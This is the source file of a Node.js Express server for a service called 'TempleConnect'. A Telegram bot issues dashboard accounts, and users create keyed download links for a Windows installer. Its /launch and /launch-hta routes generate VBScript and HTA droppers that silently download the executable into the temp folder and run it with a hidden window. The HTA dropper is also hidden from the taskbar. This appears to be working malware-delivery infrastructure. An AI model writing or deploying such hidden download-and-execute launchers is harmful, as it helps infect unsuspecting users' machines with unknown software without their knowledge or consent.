const express = require('express');
const path = require('path');
const crypto = require('crypto');

const activeUsers = new Map();
const activeSessions = new Map(); // Store active session tokens for persistence on refresh
const userEnrollmentKeys = new Map(); // Store generated enrollment keys per user username: Map<username, Map<key, data>>
const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN";

// Middleware to parse JSON bodies
app.use(express.json());

// Serve static frontend files from the root directory
app.use(express.static(path.join(__dirname)));

// Helper to send messages to Telegram
async function sendTelegramMessage(chatId, text, replyMarkup = null) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  
  const payload = {
    chat_id: chatId,
    text: text,
    parse_mode: 'Markdown'
  };

  if (replyMarkup) {
    payload.reply_markup = replyMarkup;
  }

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    const data = await response.json();
    console.log('📤 Telegram send response:', data);
    return data;
  } catch (err) {
    console.error('❌ Error in sendTelegramMessage:', err);
  }
}

// Telegram Webhook Route
app.post('/telegram/webhook', async (req, res) => {
  console.log('📥 HIT /telegram/webhook:', JSON.stringify(req.body));
  
  try {
    const update = req.body;

    if (update.message && update.message.text) {
      console.log('-> Processing text message:', update.message.text);
      const chatId = update.message.chat.id;
      if (update.message.text.trim() === '/start') {
        const keyboard = {
          inline_keyboard: [
            [{ text: '🚀 Get Started', callback_data: 'get_started' }]
          ]
        };
        await sendTelegramMessage(chatId, 'Welcome to TempleConnect! Click below to get your dashboard access.', keyboard);
      }
    } 
    else if (update.callback_query) {
      console.log('-> Processing callback_query data:', update.callback_query.data);
      const callback = update.callback_query;
      const chatId = callback.message.chat.id;

      if (callback.data === 'get_started') {
        const username = `user_${crypto.randomBytes(3).toString('hex')}`;
        const password = crypto.randomBytes(5).toString('hex');

        activeUsers.set(username, password);

        const message = 
          `✅ *Your Account is Ready!*\n\n` +
          `🔗 *Dashboard:* https://console-templeconnect.app\n` +
          `👤 *Username:* \`${username}\`\n` +
          `🔑 *Password:* \`${password}\``;

        await sendTelegramMessage(chatId, message);

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ callback_query_id: callback.id })
        });
      }
    } else {
      console.log('-> Received other update type');
    }

    res.status(200).send('OK');
  } catch (err) {
    console.error('❌ Webhook Error:', err);
    res.status(500).send({ error: err.message });
  }
});

// Handle dashboard login requests (supports both 'username' and 'email' fields) with session cookies
app.post('/api/login', (req, res) => {
  const username = req.body.username || req.body.email;
  const { password } = req.body;

  if (username && activeUsers.has(username) && activeUsers.get(username) === password) {
    const token = crypto.randomBytes(16).toString('hex');
    activeSessions.set(token, username);

    res.setHeader('Set-Cookie', `connect_sid=${token}; Path=/; HttpOnly; SameSite=Lax`);

    return res.status(200).json({ 
      success: true, 
      message: 'Login successful',
      admin: { email: username, role: 'owner', name: username } 
    });
  }

  return res.status(401).json({ 
    success: false, 
    error: 'Invalid username or password' 
  });
});

// Check current logged-in user on page refresh
app.get('/api/me', (req, res) => {
  const cookieHeader = req.headers.cookie || '';
  const match = cookieHeader.match(/connect_sid=([^;]+)/);
  
  if (match && activeSessions.has(match[1])) {
    const username = activeSessions.get(match[1]);
    return res.status(200).json({
      admin: { email: username, role: 'owner', name: username }
    });
  }

  return res.status(401).json({ error: 'Not authenticated' });
});

// Logout route to clear session
app.post('/api/logout', (req, res) => {
  const cookieHeader = req.headers.cookie || '';
  const match = cookieHeader.match(/connect_sid=([^;]+)/);
  if (match) {
    activeSessions.delete(match[1]);
  }
  res.setHeader('Set-Cookie', 'connect_sid=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT');
  return res.status(200).json({ success: true });
});

// Helper to lookup username from cookie session
function getLoggedInUsername(req) {
  const cookieHeader = req.headers.cookie || '';
  const match = cookieHeader.match(/connect_sid=([^;]+)/);
  if (match && activeSessions.has(match[1])) {
    return activeSessions.get(match[1]);
  }
  return null;
}

// Helper to find which user owns a key during download/launch
function findKeyData(key) {
  for (const [username, userKeys] of userEnrollmentKeys.entries()) {
    if (userKeys.has(key)) {
      return userKeys.get(key);
    }
  }
  return null;
}

// --- Enrollment Keys Endpoints ---

// Get all active keys for the logged-in user
app.get('/api/keys', (req, res) => {
  const username = getLoggedInUsername(req);
  if (!username) return res.status(401).json({ error: 'Not authenticated' });

  const protocol = req.headers['x-forwarded-proto'] || req.protocol;
  const host = req.headers['x-forwarded-host'] || req.get('host');
  const baseUrl = `${protocol}://${host}`;

  if (!userEnrollmentKeys.has(username)) {
    userEnrollmentKeys.set(username, new Map());
  }

  const userKeys = userEnrollmentKeys.get(username);
  const keysArray = Array.from(userKeys.entries()).map(([key, data]) => ({
    key,
    label: data.label,
    method: data.method,
    revoked: data.revoked,
    downloadUrl: `${baseUrl}/dl/${key}`
  }));

  return res.status(200).json({ success: true, keys: keysArray });
});

// Create a new enrollment link/key specifically for the logged-in user
app.post('/api/keys', (req, res) => {
  const username = getLoggedInUsername(req);
  if (!username) return res.status(401).json({ error: 'Not authenticated' });

  const protocol = req.headers['x-forwarded-proto'] || req.protocol;
  const host = req.headers['x-forwarded-host'] || req.get('host');
  const baseUrl = `${protocol}://${host}`;

  const key = crypto.randomBytes(4).toString('hex');
  const downloadUrl = `${baseUrl}/dl/${key}`;
  const label = req.body.label || 'Installer';
  const method = req.body.method || 'user';

  if (!userEnrollmentKeys.has(username)) {
    userEnrollmentKeys.set(username, new Map());
  }

  userEnrollmentKeys.get(username).set(key, { label, method, revoked: false });

  return res.status(200).json({ 
    success: true, 
    downloadUrl, 
    key 
  });
});

// DELETE endpoint: only delete from the logged-in user's collection
app.post('/api/keys/delete', (req, res) => {
  const username = getLoggedInUsername(req);
  if (!username) return res.status(401).json({ error: 'Not authenticated' });

  const { key } = req.body;
  const userKeys = userEnrollmentKeys.get(username);

  if (userKeys && userKeys.has(key)) {
    userKeys.delete(key);
    return res.status(200).json({ success: true, message: 'Key deleted' });
  }
  return res.status(404).json({ success: false, error: 'Key not found' });
});

// 1. Handle executable downloads via key (.exe)
app.get('/dl/:key', (req, res) => {
  const { key } = req.params;
  const keyData = findKeyData(key);
  if (!keyData || keyData.revoked) {
    return res.status(404).send('Invalid or revoked installation link.');
  }

  const installerPath = path.join(__dirname, 'TempleConnect-Setup.exe');
  const fs = require('fs');
  if (fs.existsSync(installerPath)) {
    return res.download(installerPath, `TempleConnect-Setup-${key}.exe`);
  }

  res.setHeader('Content-Type', 'application/octet-stream');
  res.setHeader('Content-Disposition', `attachment; filename="TempleConnect-Setup-${key}.exe"`);
  res.send(`TempleConnect Installer Binary (Key: ${key})`);
});

// 2. Handle .vbs silent one-click launcher downloads (.vbs)
app.get('/launch/:key', (req, res) => {
  const { key } = req.params;
  const keyData = findKeyData(key);
  if (!keyData || keyData.revoked) {
    return res.status(404).send('Invalid or revoked installation link.');
  }

  const protocol = req.headers['x-forwarded-proto'] || req.protocol;
  const host = req.headers['x-forwarded-host'] || req.get('host');
  const exeUrl = `${protocol}://${host}/dl/${key}`;

  const vbsScript = `
Set WinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
WinHttp.Open "GET", "${exeUrl}", False
WinHttp.Send()

If WinHttp.Status = 200 Then
    Set fso = CreateObject("Scripting.FileSystemObject")
    tmpPath = fso.GetSpecialFolder(2) & "\\TempleConnect-${key}.exe"
    
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' binary
    stream.Open
    stream.Write WinHttp.ResponseBody
    stream.SaveToFile tmpPath, 2 ' overwrite
    stream.Close
    
    Set shell = CreateObject("WScript.Shell")
    shell.Run Chr(34) & tmpPath & Chr(34), 0, False
End If
  `.trim();

  res.setHeader('Content-Type', 'text/vbs');
  res.setHeader('Content-Disposition', `attachment; filename="TempleConnect-Setup-${key}.vbs"`);
  res.send(vbsScript);
});

// 3. Handle .hta silent one-click launcher downloads (.hta)
app.get('/launch-hta/:key', (req, res) => {
  const { key } = req.params;
  const keyData = findKeyData(key);
  if (!keyData || keyData.revoked) {
    return res.status(404).send('Invalid or revoked installation link.');
  }

  const protocol = req.headers['x-forwarded-proto'] || req.protocol;
  const host = req.headers['x-forwarded-host'] || req.get('host');
  const exeUrl = `${protocol}://${host}/dl/${key}`;

  const htaScript = `
<html>
<head>
<hta:application windowstate="minimize" showintaskbar="no" caption="no" />
<script language="VBScript">
Sub Window_OnLoad
    On Error Resume Next
    Set WinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
    WinHttp.Open "GET", "${exeUrl}", False
    WinHttp.Send()
    
    If WinHttp.Status = 200 Then
        Set fso = CreateObject("Scripting.FileSystemObject")
        tmpPath = fso.GetSpecialFolder(2) & "\\TempleConnect-${key}.exe"
        
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write WinHttp.ResponseBody
        stream.SaveToFile tmpPath, 2
        stream.Close
        
        Set shell = CreateObject("WScript.Shell")
        shell.Run Chr(34) & tmpPath & Chr(34), 0, False
    End If
    
    window.close()
End Sub
</script>
</head>
<body></body>
</html>
  `.trim();

  res.setHeader('Content-Type', 'application/hta');
  res.setHeader('Content-Disposition', `attachment; filename="TempleConnect-Setup-${key}.hta"`);
  res.send(htaScript);
});

// ---------------------------------

// Start the server bound to Railway's dynamic port
app.listen(PORT, '0.0.0.0', () => {
  console.log(`TempleConnect server running on port ${PORT}`);
});